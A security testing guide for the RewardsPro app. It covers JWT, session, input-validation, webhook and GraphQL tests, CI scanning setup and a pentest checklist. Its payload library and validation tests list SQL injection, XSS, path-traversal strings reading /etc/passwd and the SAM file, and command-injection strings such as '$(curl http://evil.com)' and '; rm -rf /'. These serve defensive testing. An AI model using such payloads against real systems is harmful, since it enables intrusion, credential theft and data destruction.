# Security Testing Guide for RewardsPro

## Overview

This guide provides comprehensive security testing strategies for the RewardsPro application, covering automated scanning, manual testing, and continuous security validation throughout the development lifecycle.

## Testing Hierarchy

```
┌────────────────────────────────────────┐
│        Production Monitoring           │
├────────────────────────────────────────┤
│        Pre-Production Testing          │
├────────────────────────────────────────┤
│         Integration Testing            │
├────────────────────────────────────────┤
│           Unit Testing                 │
├────────────────────────────────────────┤
│       Development Testing              │
└────────────────────────────────────────┘
```

## 1. Unit Security Testing

### CRITICAL: Authentication Security Tests

```typescript
// app/utils/__tests__/auth.security.test.ts
import { describe, it, expect } from 'vitest';
import { SecureJWTManager } from '../jwt-security';

describe('CRITICAL: Authentication Security', () => {
  describe('JWT Algorithm Confusion Prevention', () => {
    it('must reject none algorithm tokens', async () => {
      const noneToken = 'eyJhbGciOiJub25lIn0.eyJzaG9wIjoidGVzdCJ9.';
      await expect(jwtManager.verifyToken(noneToken))
        .rejects.toThrow('Invalid algorithm');
    });
    
    it('must reject HS256 when expecting ES256', async () => {
      const hmacToken = jwt.sign(payload, publicKey, { algorithm: 'HS256' });
      await expect(jwtManager.verifyToken(hmacToken))
        .rejects.toThrow();
    });
    
    it('must enforce 15-minute token expiry', async () => {
      const token = await jwtManager.signAccessToken(payload);
      jest.advanceTimersByTime(16 * 60 * 1000);
      await expect(jwtManager.verifyToken(token))
        .rejects.toThrow('Token expired');
    });
  });
  
  describe('Session Hijacking Prevention', () => {
    it('must detect fingerprint changes', async () => {
      const sessionId = await createSession(chromeRequest);
      await expect(validateSession(sessionId, firefoxRequest))
        .rejects.toThrow('Session fingerprint mismatch');
    });
    
    it('must enforce concurrent session limit', async () => {
      const sessions = await createMultipleSessions(shop, 4);
      const activeSessions = await getActiveSessions(shop);
      expect(activeSessions.length).toBeLessThanOrEqual(3);
    });
  });
  
  describe('Token Storage Security', () => {
    it('must never store tokens in localStorage', () => {
      expect(localStorage.getItem('token')).toBeNull();
      expect(localStorage.getItem('auth-token')).toBeNull();
      expect(localStorage.getItem('access-token')).toBeNull();
    });
    
    it('must use httpOnly cookies', async () => {
      const response = await login(credentials);
      const cookie = response.headers.get('Set-Cookie');
      expect(cookie).toContain('HttpOnly');
      expect(cookie).toContain('Secure');
      expect(cookie).toContain('SameSite=Strict');
    });
  });
});
```

### Input Validation Tests

```typescript
// app/utils/__tests__/validation.security.test.ts
import { describe, it, expect } from 'vitest';
import { validateCustomerInput } from '../validation';

describe('Security: Input Validation', () => {
  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE customers; --",
        "1' OR '1'='1",
        "admin'--",
        "1' UNION SELECT * FROM sessions--"
      ];

      maliciousInputs.forEach(input => {
        expect(() => validateCustomerInput({ email: input }))
          .toThrow('Invalid input');
      });
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize XSS payloads', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">'
      ];

      xssPayloads.forEach(payload => {
        const result = validateCustomerInput({ name: payload });
        expect(result.name).not.toContain('<script>');
        expect(result.name).not.toContain('javascript:');
        expect(result.name).not.toContain('onerror');
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should reject NoSQL injection attempts', () => {
      const nosqlPayloads = [
        { $gt: '' },
        { $ne: null },
        { email: { $regex: '.*' } }
      ];

      nosqlPayloads.forEach(payload => {
        expect(() => validateCustomerInput(payload))
          .toThrow();
      });
    });
  });
});
```

### Store Credit Security Tests

```typescript
// app/utils/__tests__/store-credit.security.test.ts
describe('Security: Store Credit Operations', () => {
  it('should prevent negative credit manipulation', () => {
    expect(() => updateStoreCredit(customerId, -1000000))
      .toThrow('Invalid credit amount');
  });

  it('should prevent credit overflow attacks', () => {
    expect(() => updateStoreCredit(customerId, Number.MAX_SAFE_INTEGER + 1))
      .toThrow('Credit amount exceeds maximum');
  });

  it('should validate credit precision', () => {
    expect(() => updateStoreCredit(customerId, 10.999))
      .toThrow('Invalid precision');
  });

  it('should prevent concurrent credit updates', async () => {
    const updates = Array(10).fill(null).map(() => 
      updateStoreCredit(customerId, 100)
    );
    
    const results = await Promise.allSettled(updates);
    const successful = results.filter(r => r.status === 'fulfilled');
    expect(successful).toHaveLength(1);
  });
});
```

## 2. Integration Security Testing

### API Security Tests

```typescript
// app/routes/__tests__/api.security.test.ts
import { describe, it, expect } from 'vitest';
import { createTestClient } from '../test-utils';

describe('API Security', () => {
  const client = createTestClient();

  describe('Authentication', () => {
    it('should reject requests without authentication', async () => {
      const response = await fetch('/app/customers', {
        headers: {}
      });
      expect(response.status).toBe(401);
    });

    it('should reject expired tokens', async () => {
      const response = await fetch('/app/customers', {
        headers: { 'Authorization': 'Bearer expired-token' }
      });
      expect(response.status).toBe(401);
    });

    it('should reject tampered tokens', async () => {
      const validToken = 'valid.jwt.token';
      const tamperedToken = validToken.replace('a', 'b');
      
      const response = await fetch('/app/customers', {
        headers: { 'Authorization': `Bearer ${tamperedToken}` }
      });
      expect(response.status).toBe(401);
    });
  });

  describe('CSRF Protection', () => {
    it('should reject requests without CSRF token', async () => {
      const response = await fetch('/app/tiers', {
        method: 'POST',
        body: JSON.stringify({ name: 'Test' })
      });
      expect(response.status).toBe(403);
    });
  });

  describe('Rate Limiting', () => {
    it('should rate limit excessive requests', async () => {
      const requests = Array(100).fill(null).map(() =>
        fetch('/api/health')
      );
      
      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });
});
```

### Webhook Security Tests

```typescript
// app/routes/__tests__/webhooks.security.test.ts
describe('Webhook Security', () => {
  describe('HMAC Validation', () => {
    it('should reject webhooks with invalid HMAC', async () => {
      const response = await fetch('/webhooks/orders/paid', {
        method: 'POST',
        headers: {
          'X-Shopify-Hmac-Sha256': 'invalid-hmac'
        },
        body: JSON.stringify({ order: {} })
      });
      expect(response.status).toBe(401);
    });

    it('should accept webhooks with valid HMAC', async () => {
      const body = JSON.stringify({ order: {} });
      const hmac = computeHmac(body, process.env.SHOPIFY_WEBHOOK_SECRET);
      
      const response = await fetch('/webhooks/orders/paid', {
        method: 'POST',
        headers: {
          'X-Shopify-Hmac-Sha256': hmac
        },
        body
      });
      expect(response.status).toBe(200);
    });
  });

  describe('Replay Attack Prevention', () => {
    it('should reject duplicate webhook deliveries', async () => {
      const webhookId = 'webhook-123';
      const body = JSON.stringify({ id: webhookId });
      
      // First delivery
      await deliverWebhook(body);
      
      // Replay attempt
      const response = await deliverWebhook(body);
      expect(response.status).toBe(409); // Conflict
    });
  });
});
```

## 3. End-to-End Security Testing

### Playwright Security Scenarios

```typescript
// tests/e2e/security.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Security E2E Tests', () => {
  test('should prevent XSS in customer names', async ({ page }) => {
    await page.goto('/app/customers');
    
    // Try to inject XSS
    await page.fill('[name="customerName"]', '<script>alert("XSS")</script>');
    await page.click('[type="submit"]');
    
    // Verify script is not executed
    const alerts = [];
    page.on('dialog', dialog => alerts.push(dialog));
    await page.waitForTimeout(1000);
    expect(alerts).toHaveLength(0);
    
    // Verify escaped content
    const content = await page.textContent('.customer-name');
    expect(content).not.toContain('<script>');
  });

  test('should enforce CSP headers', async ({ page }) => {
    const response = await page.goto('/app');
    const csp = response.headers()['content-security-policy'];
    
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self' 'unsafe-inline' https://cdn.shopify.com");
    expect(csp).toContain("frame-ancestors https://admin.shopify.com");
  });

  test('should prevent clickjacking', async ({ page }) => {
    const response = await page.goto('/app');
    const xFrameOptions = response.headers()['x-frame-options'];
    
    expect(xFrameOptions).toBe('DENY');
  });
});
```

### GraphQL Security Tests

```typescript
// tests/e2e/graphql-security.spec.ts
test.describe('GraphQL Security', () => {
  test('should prevent query depth attacks', async ({ request }) => {
    const deepQuery = `
      query {
        customer {
          orders {
            items {
              product {
                variants {
                  inventory {
                    location {
                      address {
                        country {
                          provinces {
                            cities
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    `;
    
    const response = await request.post('/graphql', {
      data: { query: deepQuery }
    });
    
    expect(response.status()).toBe(400);
    const error = await response.json();
    expect(error.message).toContain('Query depth exceeded');
  });

  test('should prevent introspection in production', async ({ request }) => {
    const introspectionQuery = `
      query {
        __schema {
          types {
            name
          }
        }
      }
    `;
    
    const response = await request.post('/graphql', {
      data: { query: introspectionQuery }
    });
    
    if (process.env.NODE_ENV === 'production') {
      expect(response.status()).toBe(400);
    }
  });
});
```

## 4. Automated Security Scanning

### SAST Configuration

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run ESLint Security Plugin
        run: |
          npm ci
          npx eslint . --ext .ts,.tsx --config .eslintrc.security.json
      
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/typescript
            p/react
      
      - name: Run GitHub CodeQL
        uses: github/codeql-action/analyze@v2
```

### DAST Configuration

```yaml
# owasp-zap-scan.yml
name: OWASP ZAP Scan

on:
  schedule:
    - cron: '0 0 * * *' # Daily

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
      - name: ZAP Scan
        uses: zaproxy/action-full-scan@v0.4.0
        with:
          target: 'https://staging.rewardspro.app'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a -j -l INFO'
```

### Dependency Scanning

```json
// package.json
{
  "scripts": {
    "security:audit": "npm audit --audit-level=moderate",
    "security:snyk": "snyk test",
    "security:deps": "npm run security:audit && npm run security:snyk",
    "security:fix": "npm audit fix && snyk wizard"
  }
}
```

## 5. Manual Security Testing

### Penetration Testing Checklist

#### Authentication & Session Management
- [ ] Test password reset flow for vulnerabilities
- [ ] Verify session timeout functionality
- [ ] Test concurrent session handling
- [ ] Check for session fixation vulnerabilities
- [ ] Verify token expiration and renewal

#### Input Validation
- [ ] Test all input fields with malicious payloads
- [ ] Verify file upload restrictions
- [ ] Test API parameter tampering
- [ ] Check for buffer overflow vulnerabilities
- [ ] Test Unicode and encoding attacks

#### Business Logic
- [ ] Test tier manipulation attempts
- [ ] Verify store credit calculation integrity
- [ ] Test race conditions in credit updates
- [ ] Check for price manipulation vulnerabilities
- [ ] Test discount stacking exploits

#### Integration Points
- [ ] Test Shopify webhook validation
- [ ] Verify OAuth flow security
- [ ] Test GraphQL query complexity limits
- [ ] Check third-party API security
- [ ] Verify data synchronization integrity

## 6. Security Test Data

### Malicious Payload Library

```typescript
// tests/security/payloads.ts
export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE customers; --",
  "1' AND '1' = '1",
  "' UNION SELECT * FROM users--",
  "admin'--",
  "' OR 1=1--"
];

export const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror="alert(1)">',
  'javascript:alert(1)',
  '<svg onload="alert(1)">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<iframe src="javascript:alert(1)">',
  '<body onload="alert(1)">'
];

export const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  'file:///etc/passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
];

export const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| whoami',
  '`cat /etc/passwd`',
  '$(curl http://evil.com)',
  '& net user',
  '; rm -rf /'
];
```

## 7. Security Regression Testing

### Critical Security Tests Suite

```typescript
// tests/security/regression.test.ts
describe('Security Regression Tests', () => {
  // Run these tests on every commit
  const criticalTests = [
    'SQL injection in customer search',
    'XSS in tier names',
    'CSRF in credit updates',
    'Authentication bypass',
    'Session hijacking',
    'Webhook signature validation'
  ];

  criticalTests.forEach(testName => {
    it(`should prevent ${testName}`, async () => {
      // Test implementation
    });
  });
});
```

## 8. Security Test Metrics

### Coverage Requirements
- **Unit Tests**: 90% code coverage
- **Integration Tests**: All API endpoints
- **E2E Tests**: Critical user flows
- **Security Tests**: All input points

### Performance Benchmarks
- SAST scan: < 5 minutes
- DAST scan: < 30 minutes
- Unit tests: < 2 minutes
- E2E tests: < 10 minutes

### Success Criteria
- Zero critical vulnerabilities
- Zero high vulnerabilities in production
- < 5 medium vulnerabilities
- All security tests passing
- No regression in security posture

## 9. Continuous Security Testing

### Pre-Commit Hooks

```bash
# .husky/pre-commit
#!/bin/sh
npm run security:audit
npm run test:security:unit
```

### CI/CD Pipeline

```yaml
# .github/workflows/ci.yml
security-gates:
  - dependency-check
  - sast-scan
  - unit-security-tests
  - integration-security-tests
  - security-headers-check
  - csp-validation
```

### Production Monitoring

```typescript
// monitoring/security-alerts.ts
const securityMonitors = {
  failedLogins: { threshold: 10, window: '5m' },
  sqlErrors: { threshold: 5, window: '1m' },
  xssAttempts: { threshold: 3, window: '1m' },
  creditAnomalies: { threshold: 1, window: '1m' },
  webhookFailures: { threshold: 5, window: '5m' }
};
```

## 10. Security Test Reporting

### Test Report Template

```markdown
# Security Test Report - [Date]

## Executive Summary
- Tests Run: X
- Passed: X
- Failed: X
- Vulnerabilities Found: X

## Critical Findings
1. [Vulnerability description]
   - Severity: Critical/High/Medium/Low
   - Impact: [Business impact]
   - Remediation: [Fix description]

## Test Coverage
- Input Validation: X%
- Authentication: X%
- Authorization: X%
- Session Management: X%
- Data Protection: X%

## Recommendations
1. [Action item]
2. [Action item]

## Next Steps
- [Planned improvements]
```

---

*Last Updated: January 2025 | Security Level: HIGH | Classification: Internal*